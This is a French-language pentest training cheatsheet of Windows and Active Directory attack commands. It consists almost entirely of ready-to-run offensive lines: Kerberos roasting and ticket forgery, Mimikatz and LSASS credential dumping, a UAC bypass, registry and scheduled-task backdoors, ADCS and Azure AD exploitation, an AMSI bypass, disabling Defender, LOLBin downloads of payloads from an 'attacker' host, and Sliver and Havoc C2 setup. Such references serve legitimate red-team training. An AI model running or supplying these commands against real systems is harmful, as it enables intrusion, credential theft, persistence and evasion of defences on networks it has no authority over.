---
tags:
  - formation
  - cheatsheet
  - windows
  - hacking
  - tools
---

# Cheatsheet - Windows Hacking Tools

Référence rapide des commandes essentielles pour le pentest Windows/AD.

---

## Reconnaissance

### Nmap

```bash
# Scan rapide des ports AD
nmap -sS -p 53,88,135,139,389,445,636,3268,5985 192.168.56.0/24

# Scan complet avec scripts
nmap -sV -sC -p- 192.168.56.10 -oA full_scan

# Scripts AD spécifiques
nmap --script "ldap* and not brute" -p 389 192.168.56.10
nmap --script smb-enum-* -p 445 192.168.56.10
```

### CrackMapExec / NetExec

```bash
# Discovery
crackmapexec smb 192.168.56.0/24

# Enumération avec creds
crackmapexec smb 192.168.56.10 -u 'user' -p 'pass' --shares
crackmapexec smb 192.168.56.10 -u 'user' -p 'pass' --users
crackmapexec smb 192.168.56.10 -u 'user' -p 'pass' --groups
crackmapexec smb 192.168.56.10 -u 'user' -p 'pass' --pass-pol

# Password spray
crackmapexec smb 192.168.56.10 -u users.txt -p 'Password1' --continue-on-success

# Exécution de commande
crackmapexec smb 192.168.56.10 -u 'admin' -p 'pass' -x "whoami"
crackmapexec smb 192.168.56.10 -u 'admin' -H HASH -x "whoami"
```

### BloodHound

```bash
# Collecte depuis Linux
bloodhound-python -d domain.local -u user -p 'pass' -dc dc01.domain.local -c All

# Collecte depuis Windows
.\SharpHound.exe -c All
.\SharpHound.exe -c All,LoggedOn --stealth
```

---

## Attaques Kerberos

### Kerberoasting

```bash
# Impacket
GetUserSPNs.py domain.local/user:'pass' -dc-ip 192.168.56.10 -request -outputfile kerberoast.txt

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Cracking
hashcat -m 13100 kerberoast.txt wordlist.txt
```

### AS-REP Roasting

```bash
# Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 192.168.56.10 -format hashcat -outputfile asrep.txt

# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Cracking
hashcat -m 18200 asrep.txt wordlist.txt
```

### Pass-the-Hash

```bash
# Impacket
psexec.py domain.local/Administrator@192.168.56.10 -hashes :HASH
wmiexec.py domain.local/Administrator@192.168.56.10 -hashes :HASH
smbexec.py domain.local/Administrator@192.168.56.10 -hashes :HASH

# Evil-WinRM
evil-winrm -i 192.168.56.10 -u Administrator -H HASH

# CrackMapExec
crackmapexec smb 192.168.56.10 -u Administrator -H HASH
```

### Pass-the-Ticket

```bash
# Export tickets (Mimikatz)
sekurlsa::tickets /export

# Import ticket (Linux)
export KRB5CCNAME=ticket.ccache
psexec.py domain.local/user@target -k -no-pass

# Import ticket (Rubeus)
.\Rubeus.exe ptt /ticket:ticket.kirbi
```

### Golden Ticket

```powershell
# Mimikatz
kerberos::golden /user:FakeAdmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Impacket
ticketer.py -nthash HASH -domain-sid S-1-5-21-... -domain domain.local Administrator
```

---

## Credential Dumping

### Mimikatz

```powershell
# Commandes de base
privilege::debug
token::elevate

# Dump credentials
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::ekeys
sekurlsa::tickets /export

# Dump SAM
lsadump::sam

# Dump LSA secrets
lsadump::secrets

# DCSync
lsadump::dcsync /user:Administrator
lsadump::dcsync /user:krbtgt
lsadump::dcsync /all /csv
```

### Impacket - secretsdump

```bash
# Dump distant
secretsdump.py domain.local/Administrator:'pass'@192.168.56.10

# Avec hash
secretsdump.py domain.local/Administrator@192.168.56.10 -hashes :HASH

# Dump local (fichiers SAM/SYSTEM)
secretsdump.py -sam sam -system system LOCAL
```

### LSASS Dump

```powershell
# ProcDump
procdump.exe -ma lsass.exe lsass.dmp

# comsvcs.dll
rundll32.exe comsvcs.dll, MiniDump [PID] lsass.dmp full

# Analyse
pypykatz lsa minidump lsass.dmp
```

---

## Privilege Escalation

### WinPEAS

```powershell
.\winpeas.exe
.\winpeas.exe quiet
.\winpeas.exe servicesinfo
```

### PowerUp

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
Get-ServiceUnquoted
Get-ModifiableService
```

### Potato Attacks

```powershell
# PrintSpoofer
.\PrintSpoofer64.exe -i -c cmd

# GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"

# JuicyPotato
.\JuicyPotato.exe -l 1337 -p C:\temp\shell.exe -t *
```

### UAC Bypass

```powershell
# Fodhelper
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```

---

## Lateral Movement

### PsExec / SMBExec / WMIExec

```bash
# PsExec (crée un service)
psexec.py domain.local/admin:'pass'@192.168.56.10

# SMBExec (pas de service)
smbexec.py domain.local/admin:'pass'@192.168.56.10

# WMIExec (via WMI)
wmiexec.py domain.local/admin:'pass'@192.168.56.10
```

### Evil-WinRM

```bash
evil-winrm -i 192.168.56.10 -u admin -p 'pass'
evil-winrm -i 192.168.56.10 -u admin -H HASH
```

### PowerShell Remoting

```powershell
Enter-PSSession -ComputerName SRV01 -Credential (Get-Credential)
Invoke-Command -ComputerName SRV01 -ScriptBlock { whoami }
```

---

## Persistence

### Registry

```powershell
# Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\shell.exe"

# Winlogon
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "userinit.exe,C:\temp\shell.exe"
```

### Scheduled Tasks

```powershell
schtasks /create /tn "Update" /tr "C:\temp\shell.exe" /sc onlogon /ru SYSTEM
```

### WMI Event Subscription

```powershell
# Voir module 5 pour le script complet
```

---

## ADCS / Certipy

### Énumération

```bash
# Énumération complète
certipy find -u user@domain.local -p 'pass' -dc-ip 192.168.56.10

# Avec output BloodHound
certipy find -u user@domain.local -p 'pass' -dc-ip 192.168.56.10 -bloodhound

# Vulnérabilités uniquement
certipy find -u user@domain.local -p 'pass' -dc-ip 192.168.56.10 -vulnerable
```

### Exploitation ESC1

```bash
# Demander un certificat pour un autre utilisateur
certipy req -u user@domain.local -p 'pass' \
    -ca 'CA-NAME' -target ca.domain.local \
    -template 'VulnerableTemplate' \
    -upn Administrator@domain.local

# S'authentifier avec le certificat
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
```

### Exploitation ESC4

```bash
# Sauvegarder et modifier le template
certipy template -u user@domain.local -p 'pass' -template 'Template' -save-old
certipy template -u user@domain.local -p 'pass' -template 'Template' -configuration ESC1
```

### Exploitation ESC8 (Relay)

```bash
# Relay vers web enrollment
certipy relay -target 'http://ca.domain.local/certsrv/certfnsh.asp' -ca 'CA-NAME'

# Forcer auth (autre terminal)
python3 PetitPotam.py ATTACKER_IP dc01.domain.local
```

---

## Azure AD / Hybrid

### Énumération

```bash
# Vérifier tenant (non authentifié)
curl "https://login.microsoftonline.com/TARGET.COM/v2.0/.well-known/openid-configuration"

# AADInternals - Recon externe
Invoke-AADIntReconAsOutsider -DomainName "target.com"

# ROADtools - Énumération complète
roadrecon auth -u user@target.com -p 'Password'
roadrecon gather
roadrecon gui

# AzureHound - BloodHound pour Azure
azurehound -u user@target.com -p 'Password' list --tenant target.com -o output.json
```

### Azure AD Connect

```powershell
# Extraire credentials AAD Connect (sur le serveur)
Import-Module AADInternals
Get-AADIntSyncCredentials

# Le compte MSOL_* a des droits DCSync!
secretsdump.py 'DOMAIN/MSOL_xxx:Password@dc01'
```

### PTA Backdoor

```powershell
# Sur serveur avec agent PTA
Install-AADIntPTASpy
Get-AADIntPTASpyLog  # Credentials en clair!
```

### Golden SAML

```powershell
# Sur serveur ADFS
Export-AADIntADFSSigningCertificate

# Forger token SAML
$saml = New-AADIntSAMLToken -ImmutableID "ID" -PfxFileName "cert.pfx" -Issuer "http://adfs.domain.local/..."
$at = Get-AADIntAccessTokenWithSAML -SAMLToken $saml -Resource "https://graph.microsoft.com"
```

### Password Spray Azure

```bash
# MSOLSpray
python3 MSOLSpray.py --userlist users.txt --password 'Spring2024!'

# Trevorspray (évite lockouts)
trevorspray -u users.txt -p passwords.txt
```

---

## SCCM / MECM

### Énumération

```powershell
# Identifier les serveurs SCCM
nslookup -type=srv _mssms_mp_.yourcompany.local

# Info depuis un client SCCM
.\SharpSCCM.exe local site-info
.\SharpSCCM.exe local client-info

# Lister composants
.\SharpSCCM.exe get management-points
.\SharpSCCM.exe get distribution-points
.\SharpSCCM.exe get collections
```

### Extraction Credentials

```powershell
# Network Access Account (NAA)
.\SharpSCCM.exe local naa
.\SharpDPAPI.exe sccm

# Task Sequence secrets
.\SharpSCCM.exe get task-sequences
.\SharpSCCM.exe get secrets
```

### Exploitation

```powershell
# Ajouter admin SCCM
.\SharpSCCM.exe admin add-admin --user DOMAIN\attacker --scope "All Systems"

# Exécuter commande sur une machine
.\SharpSCCM.exe exec -d TARGET-PC -p "cmd.exe" -a "/c whoami"

# Déployer sur collection entière
.\SharpSCCM.exe exec -d ALL-WORKSTATIONS -p "powershell.exe" -r
```

---

## Defense Evasion

### AMSI Bypass

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Defender Exclusions

```powershell
Add-MpPreference -ExclusionPath "C:\temp"
Set-MpPreference -DisableRealtimeMonitoring $true
```

### LOLBins

```powershell
# Téléchargement
certutil -urlcache -split -f http://attacker/file.exe file.exe
bitsadmin /transfer job http://attacker/file.exe C:\temp\file.exe

# Exécution
mshta http://attacker/payload.hta
rundll32 javascript:"\..\mshtml,RunHTMLApplication";...
```

---

## PowerView Quick Reference

```powershell
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController
Get-DomainPolicy

# Users
Get-DomainUser
Get-DomainUser -SPN                          # Kerberoastable
Get-DomainUser -PreauthNotRequired           # AS-REP Roastable
Get-DomainUser -AdminCount                   # Protected users

# Groups
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"

# Computers
Get-DomainComputer
Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedToAuth

# ACLs
Find-InterestingDomainAcl
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Shares
Find-DomainShare
Find-InterestingDomainShareFile

# Sessions
Get-NetSession -ComputerName DC01
Get-NetLoggedon -ComputerName WS01

# Trusts
Get-DomainTrust
Get-ForestTrust
```

---

## C2 Frameworks

### Sliver

```bash
# Installation
curl https://sliver.sh/install | sudo bash

# Démarrer le serveur
sliver-server

# Génération d'implants
sliver > generate --mtls 192.168.56.100 --os windows --arch amd64 --save /tmp/
sliver > generate beacon --mtls 192.168.56.100 --os windows --seconds 60 --jitter 30

# Listeners
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > https --domain legit-domain.com --lport 443
sliver > dns --domains c2.attacker.com

# Post-exploitation
sliver > sessions
sliver > use [SESSION_ID]
sliver (TARGET) > whoami
sliver (TARGET) > shell
sliver (TARGET) > upload /tmp/tool.exe C:\\temp\\tool.exe
sliver (TARGET) > download C:\\Users\\admin\\secret.txt
sliver (TARGET) > screenshot
sliver (TARGET) > socks5 start

# Extensions
sliver > armory install rubeus
sliver (TARGET) > rubeus kerberoast
```

### Havoc

```bash
# Build
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc/teamserver && go build -o havoc-teamserver cmd/server/main.go
cd ../client && make

# Démarrer
./havoc-teamserver --profile profiles/havoc.yaotl
./havoc-client

# Interface graphique pour:
# - Payload generation (Demon agent)
# - Listener configuration
# - Post-exploitation modules
# - BOF execution
```

---

## Hashcat Modes

| Mode | Hash Type |
|------|-----------|
| 1000 | NTLM |
| 5600 | NTLMv2 |
| 13100 | Kerberos 5 TGS-REP (RC4) |
| 18200 | Kerberos 5 AS-REP |
| 19600 | Kerberos 5 TGS-REP (AES128) |
| 19700 | Kerberos 5 TGS-REP (AES256) |
| 2100 | DCC2 (Domain Cached Credentials 2) |

```bash
# Exemples
hashcat -m 1000 ntlm.txt wordlist.txt
hashcat -m 5600 ntlmv2.txt wordlist.txt -r best64.rule
hashcat -m 13100 kerberoast.txt wordlist.txt
```

---

[Retour au Programme](index.md){ .md-button }
